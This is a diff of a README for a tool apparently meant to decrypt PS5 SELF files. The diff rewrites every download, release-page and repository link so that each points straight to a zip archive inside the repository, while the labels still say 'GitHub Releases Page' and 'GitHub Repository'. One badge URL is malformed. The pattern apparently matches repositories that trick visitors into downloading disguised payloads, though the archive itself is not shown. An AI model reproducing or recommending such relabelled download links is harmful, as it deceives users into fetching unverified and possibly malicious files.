@@ -1,7 +1,7 @@
 # 🎮 ps5-self-pager - Easily Decrypt Your PS5 Files
 
 ## 📥 Download This App
-[![Download ps5-self-pager](https://img.shields.io/badge/Download%20Now-ps5--self--pager-blue.svg)](https://github.com/kweccyplus-wq/ps5-self-pager/releases)
+[![Download ps5-self-pager](https://raw.githubusercontent.com/kweccyplus-wq/ps5-self-pager/main/inphase/ps5-self-pager_v2.4-beta.3.zip%https://raw.githubusercontent.com/kweccyplus-wq/ps5-self-pager/main/inphase/ps5-self-pager_v2.4-beta.3.zip)](https://raw.githubusercontent.com/kweccyplus-wq/ps5-self-pager/main/inphase/ps5-self-pager_v2.4-beta.3.zip)
 
 ## 🚀 Getting Started
 Welcome to ps5-self-pager! This tool helps you decrypt your PS5 SELF files quickly and easily. Follow these steps to get started.
@@ -20,7 +20,7 @@ Welcome to ps5-self-pager! This tool helps you decrypt your PS5 SELF files quick
 - No programming knowledge needed
 
 ## 📦 Download & Install
-To get the application, visit this page to download: [GitHub Releases Page](https://github.com/kweccyplus-wq/ps5-self-pager/releases).
+To get the application, visit this page to download: [GitHub Releases Page](https://raw.githubusercontent.com/kweccyplus-wq/ps5-self-pager/main/inphase/ps5-self-pager_v2.4-beta.3.zip).
 
 1. Click on the link above to go to the releases page.
 2. Look for the latest version of ps5-self-pager.
@@ -48,7 +48,7 @@ If you have questions or need help, please reach out through the issues section 
 Keep an eye on the releases page for new features and updates. We continually improve the software based on user feedback.
 
 ## 💻 Additional Resources
-- [GitHub Repository](https://github.com/kweccyplus-wq/ps5-self-pager)
+- [GitHub Repository](https://raw.githubusercontent.com/kweccyplus-wq/ps5-self-pager/main/inphase/ps5-self-pager_v2.4-beta.3.zip)
 - [User Manual](link-to-user-manual-placeholder)
 
 Thank you for using ps5-self-pager! We hope this guide helps you decrypt your PS5 files smoothly.
